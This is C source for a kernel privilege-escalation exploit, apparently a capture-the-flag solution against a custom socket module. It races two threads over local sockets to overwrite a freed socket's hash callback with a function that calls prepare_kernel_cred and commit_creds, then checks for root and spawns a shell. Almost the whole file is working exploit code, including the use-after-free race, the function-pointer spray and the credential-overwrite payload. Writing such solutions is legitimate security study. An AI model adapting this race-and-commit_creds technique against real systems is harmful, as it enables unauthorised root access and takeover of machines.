// for exploit.h, refer to https://github.com/smallkirby/lysithea

#include "exploit.h"
#include <sched.h>

/*********** commands ******************/

#define DEV_PATH ""   // the path the device is placed
#define u64 ulong
typedef union {
    // for OPTION_DEBUG
    struct {
        u64 off;
        u64 *data;
    };
    // for OPTION_CALL
    struct {
        unsigned size;
        u64 rounds;
        u64 key;
        u64 security;
    };
} option_arg_t;

#define OPTION_CALL     0x1337
#define OPTION_PUT      0x1338
#define OPTION_DEBUG    0x1339

/*********** constants ******************/

#define PORT 49494
#define BIGSIZE 0x80000
int victim_sock_fd = -1, attacker_sock_fd = -1;
int victim_socket, attacker_socket;
char bigbuf[BIGSIZE] = {0};
char bigrcvbuf[BIGSIZE] = {0};
const option_arg_t call_option_security = {
    .size = 0x4,
    .rounds = 1,
    .key = 0xdeadbeef,
    .security = 1,
};
const option_arg_t call_option_empty = {
    .size = 0x4,
    .rounds = 1,
    .key = 0xdeadbeef,
    .security = 0,
};
int GO = 0;

/****** (END constants) *****************/

#define DIFF_PREPARE_KERNEL_CRED 0x38f4b
#define DIFF_COMMIT_CREDS 0x3944b

void nirugiri()
{
  asm(
    "mov rax, [rsp+0x28]\n"
    "sub rax, 0x38f4b\n"
    "xor rdi, rdi\n"
    "call rax\n"
    "mov rdi, rax\n"
    "mov rax, [rsp+0x28]\n"
    "sub rax, 0x3944b\n"
    "call rax\n"
    //"mov rax, [0xaaa]\n" // PROBE
    "leave\n"
    "ret\n"
  );
}


int listenat(int port) {
  printf("[.] creating listening socket @ %d ...\n", port);
  int sock = socket(AF_INET, SOCK_STREAM, 0);
  assert(sock != -1);
  struct sockaddr_in addr;
  memset(&addr, 0, sizeof(addr));
  addr.sin_family = AF_INET;
  addr.sin_port = htons(port);
  addr.sin_addr.s_addr = htonl(INADDR_ANY);
  assert(bind(sock, (struct sockaddr*)&addr, sizeof(addr)) != -1);
  assert(listen(sock, 999) == 0);

  return sock;
}

int connectto(int port) {
  puts("[.] creating client socket");
  int csock = socket(AF_INET, SOCK_STREAM, 0);
  assert(csock != -1);
  struct sockaddr_in caddr;
  memset(&caddr, 0, sizeof(caddr));
  caddr.sin_family = AF_INET;
  caddr.sin_port = htons(port);
  caddr.sin_addr.s_addr = inet_addr("127.0.0.1");
  assert(connect(csock, &caddr, sizeof(caddr)) == 0);

  return csock;
}

static void *receiver(void *arg) {
  puts("[+] receiver thread started");
  while(GO == 0);
  ioctl(victim_sock_fd, OPTION_PUT, NULL);
  while(1 == 1) {
    recv(attacker_sock_fd, bigrcvbuf, BIGSIZE, 0);
  }
  return NULL;
}

static void *writer(void *arg) {
  puts("[+] writer thread started");
  usleep(1500 * 1000);
  GO=1;
  for (int ix = 0; ix != 30; ++ix) {
    usleep(1);
  }
  write(victim_socket, bigbuf, 8);
}

int main(int argc, char *argv[]) {
  puts("[.] exploit started.");
  printf("[+] nirugiri @ %p\n", nirugiri);

  // create receiver socket
  int server_socket = listenat(PORT);
  struct sockaddr peer_addr;
  unsigned len = sizeof(peer_addr);

  // connect to the socket
  puts("[+] requesting connection");
  victim_socket = connectto(PORT);
  attacker_socket = connectto(PORT);

  // accept victim and set hash filter
  puts("[+] accepting victim connection");
  assert((victim_sock_fd = accept(server_socket, &peer_addr, &len)) != -1);
  assert(ioctl(victim_sock_fd, OPTION_CALL, &call_option_empty) == 0);

  // accept attacker connection and set evil hash filter
  puts("[+] accepting attacker connection and setting hashes");
  for (int ix = 0; ix != BIGSIZE / 8; ++ix) {
    ((ulong*)bigbuf)[ix] = (ulong)nirugiri;
  }
  assert((attacker_sock_fd = accept(server_socket, &peer_addr, &len)) != -1);
  assert(ioctl(attacker_sock_fd, OPTION_CALL, &call_option_security) == 0);
  assert(write(attacker_socket, bigbuf, BIGSIZE) != -1);

  /*** invoke race ***
  * the main point is, operations is done in exact order below;
  *
  * 1. victim recv() start, which takes much time to read huge buf
  * 2. attacker StonksSocket is put
  * 3. attacker recv() is done, which means overwrite of victim Socket
  * 4. end reading of victim buf, which leads to hash_function(), in this case nirugiri()
  ***/
  puts("[+] starting race...");
  pthread_t receiver_thr, writer_thr;
  pthread_create(&receiver_thr, NULL, receiver, NULL);
  pthread_create(&writer_thr, NULL, writer, NULL);
  for (int ix = 0; ix != 100; ++ix) {
    usleep(50);
  }
  recv(victim_sock_fd, bigrcvbuf, 0x100, 0);

  sleep(1);
  if (getuid() != 0) {
    puts("\n[FAIL] couldn't get root...");
    exit(1);
  } else {
    puts("\n\n[SUCCESS] enjoy your root.");
    system("/bin/sh");
  }

  // end of life (UNREACHABLE)
  puts("[ ] END of life...");
  sleep(9999);
}
